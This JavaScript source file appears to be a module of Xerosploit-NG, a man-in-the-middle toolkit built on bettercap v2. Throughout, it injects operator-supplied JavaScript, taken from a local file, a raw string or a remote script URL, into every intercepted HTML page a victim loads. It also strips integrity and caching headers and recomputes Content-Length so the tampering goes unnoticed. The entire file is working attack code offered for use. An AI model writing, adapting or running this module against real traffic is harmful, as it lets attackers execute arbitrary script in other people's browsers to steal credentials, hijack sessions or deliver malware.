// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- InjectJs
//
// Injects JavaScript into every proxied text/html response, right before
// </head> (with a </body> / end-of-document fallback).
//
// Ported from the bettercap v1 Ruby proxy module:
//   lib/bettercap/proxy/http/modules/injectjs.rb   (GPLv3)
//
// This module is loaded as an http.proxy.script; it does NOT rely on
// bettercap's built-in http.proxy.injectjs (which is broken upstream).
//
// Generated parameter globals (lib/engine.py, PORT-SPEC section 6):
//   XE_JS_FILE  absolute path of a JS file to inline   (highest priority)
//   XE_JS_DATA  raw JavaScript string to inline        (fallback)
//   XE_JS_URL   external script URL                    (last resort)
//
// FAIL-OPEN BODY DISCIPLINE (bettercap v2): res.ReadBody() flips bettercap's
// "body modified" flag, so after the body has been read this module MUST write
// a body back or bettercap emits an EMPTY response.  The decision to rewrite
// is therefore made from method/status/headers alone; only then is the body
// read exactly once.  Every exit path after that read sets the body and a
// Content-Length equal to the UTF-8 byte length of the string it writes:
// either the injected bytes, or the byte-exact original when the rewrite throws.
// GET + status 200 + no Range/Content-Range only; RANGE/206 responses are never
// touched.  A response this module does not handle is left byte-identical.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "injectjs";

function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

// Case-insensitive read from a bettercap header map (req.Headers / res.Headers).
function xeGetHeader(headers, name) {
    if (!headers) { return null; }
    var want = ("" + name).toLowerCase();
    var key;
    for (key in headers) {
        if (("" + key).toLowerCase() === want) {
            var value = headers[key];
            if (value === null || value === undefined) { return null; }
            return value;
        }
    }
    return null;
}

// Decide, from method/status/headers ALONE (no body read), whether this
// response may be rewritten as a full-body 200.
function xeSkipResponse(req, res) {
    if (!req || req.Method !== "GET") { return true; }
    if (!res || res.Status !== 200) { return true; }
    if (xeGetHeader(req.Headers, "Range")) { return true; }
    if (xeGetHeader(res.Headers, "Content-Range")) { return true; }
    return false;
}

var XE_STALE_HEADERS = [
    "Content-Range", "Accept-Ranges", "ETag", "Last-Modified", "Digest",
    "Content-MD5", "Content-Disposition", "Content-Encoding", "Transfer-Encoding"
];

function xeWriteBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
}

function xeReplaceBody(res, body, contentType) {
    if (typeof res.RemoveHeader === "function") {
        for (var i = 0; i < XE_STALE_HEADERS.length; i++) {
            res.RemoveHeader(XE_STALE_HEADERS[i]);
        }
    }
    if (contentType && typeof res.SetHeader === "function") {
        res.SetHeader("Content-Type", contentType);
    }
    xeWriteBody(res, body);
}

function xeIsHtml(res) {
    return !!res && typeof res.ContentType === "string" &&
        res.ContentType.toLowerCase().indexOf("text/html") === 0;
}

function xeReadFile(path) {
    if (!path || typeof readFile !== "function") { return null; }
    try { return readFile(path); } catch (e) { xeWarn("cannot read " + path + ": " + e); return null; }
}

function xeReadBody(res) {
    if (!res) { return null; }
    if (typeof res.ReadBody === "function") { return res.ReadBody(); }
    return res.Body;
}

function xeInjectBeforeCloseTag(body, snippet) {
    var lower = body.toLowerCase();
    var at = lower.indexOf("</head>");
    if (at !== -1) { return body.substring(0, at) + snippet + body.substring(at); }
    at = lower.indexOf("</body>");
    if (at !== -1) { return body.substring(0, at) + snippet + body.substring(at); }
    return body + snippet;
}

// Wrap raw JavaScript in a <script> tag unless it already looks like markup
// (mirrors v1 injectjs.rb: add the wrapper only when "<script" is absent).
// The closing tag is built with an escaped slash so this module's SOURCE never
// contains a literal script-closing tag an HTML parser could treat as a close.
function xeWrapScript(js) {
    if (typeof js !== "string" || js.length === 0) { return null; }
    if (js.toLowerCase().indexOf("<script") !== -1) { return js; }
    return "<script type=\"text/javascript\">\n" + js + "\n<\/script>";
}

function onLoad() {
    var f = (typeof XE_JS_FILE === "undefined") ? null : XE_JS_FILE;
    var d = (typeof XE_JS_DATA === "undefined") ? null : XE_JS_DATA;
    var u = (typeof XE_JS_URL === "undefined") ? null : XE_JS_URL;
    xeLog("loaded (js_file=" + f + ", js_data=" + (d ? "<" + d.length + " bytes>" : null) + ", js_url=" + u + ")");
}

function onResponse(req, res) {
    // Decide from headers/URL only; a skipped response is never read or mutated.
    if (!xeIsHtml(res)) { return; }
    if (xeSkipResponse(req, res)) { return; }

    var jsFile = (typeof XE_JS_FILE === "undefined") ? null : XE_JS_FILE;
    var jsData = (typeof XE_JS_DATA === "undefined") ? null : XE_JS_DATA;
    var jsUrl = (typeof XE_JS_URL === "undefined") ? null : XE_JS_URL;

    // Build the snippet BEFORE reading the body: if there is nothing to inject
    // the response must stay byte-identical.
    var snippet = null;
    if (jsFile) {
        snippet = xeWrapScript(xeReadFile(jsFile));
    } else if (jsData) {
        snippet = xeWrapScript("" + jsData);
    } else if (jsUrl) {
        snippet = "<script src=\"" + jsUrl + "\" type=\"text/javascript\"><\/script>";
    }

    if (!snippet) { xeWarn("no XE_JS_FILE / XE_JS_DATA / XE_JS_URL set; passing through"); return; }

    // Committed to rewriting: read the body exactly once and always write back.
    var original = null;
    try {
        original = xeReadBody(res);
        if (typeof original !== "string") { return; }

        var where = (req && req.Hostname ? req.Hostname : "") + (req && req.Path ? req.Path : "");
        xeLog("injecting javascript into " + where);

        var out = xeInjectBeforeCloseTag(original, snippet);
        if (out !== original) {
            xeReplaceBody(res, out, (typeof res.ContentType === "string" && res.ContentType) ? res.ContentType : "text/html");
        } else {
            xeWriteBody(res, original);
        }
    } catch (e) {
        xeWarn("onResponse failed: " + e);
        if (typeof original === "string") {
            xeWriteBody(res, original);                                  // fail-open: exact original bytes
        }
    }
}
